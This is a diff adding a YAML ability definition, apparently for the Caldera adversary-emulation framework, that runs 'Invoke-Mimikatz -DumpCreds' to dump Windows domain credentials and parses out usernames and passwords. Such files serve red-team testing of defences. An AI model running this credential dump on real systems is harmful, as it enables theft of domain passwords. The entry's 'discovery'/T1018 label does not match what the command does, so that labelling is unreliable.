@@ -1,0 +1,20 @@
+---
+- id: 7049e3ec-b822-4fdf-a4ac-18190f9b66d1
+  name: Powerkatz (Staged)
+  description: Use Invoke-Mimikatz
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: Remote System Discovery
+  platforms:
+    windows:
+      psh:
+        payload: invoke-mimi.ps1
+        command: |
+          Import-Module .\invoke-mimi.ps1;
+          Invoke-Mimikatz -DumpCreds
+        parsers:
+          plugins.stockpile.app.parsers.katz:
+            - source: domain.user.name
+              edge: has_password
+              target: domain.user.password
